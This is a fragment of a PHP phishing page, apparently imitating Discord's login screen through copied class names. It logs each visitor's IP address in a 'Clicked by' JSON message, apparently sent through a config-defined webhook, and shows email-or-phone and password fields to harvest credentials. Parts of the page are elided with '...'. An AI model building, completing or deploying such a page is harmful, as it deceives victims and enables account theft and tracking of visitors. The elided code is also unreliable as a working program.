<?php
include 'config.php';
            $msg = json_encode(['content' => 'Clicked by '.$_SERVER['REMOTE_ADDR']], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE );
		                                        ...
		                                        <div class="mainLoginContainer-1ddwnR">
													...
													<div class="block-egJnc0 marginTop20-3TxNs6">
		                                                <div class="marginBottom20-32qID7">
		                                                    <h5 class="colorStandard-2KCXvj size14-e6ZScH h5-18_1nd title-3sZWYQ defaultMarginh5-2mL-bP" id="pole1-text">Email or Phone Number	<span class="required-1eGkuP">*</span>	                                                        <span id="elprimo1" class="errorMessage-3Guw2R" style="display: none"><span class="errorSeparator-30Q6aR">-</span>Required field</span>
		                                                    </h5>
		                                                ...
		                                                <div>
		                                                    <h5 class="colorStandard-2KCXvj size14-e6ZScH h5-18_1nd title-3sZWYQ defaultMarginh5-2mL-bP" id="pole2-text">Password	<span class="required-1eGkuP">*</span>	          	                                                        <span id="elprimo2" class="errorMessage-3Guw2R" style="display: none"><span class="errorSeparator-30Q6aR">-</span>Required field</span>
		                                                    </h5>
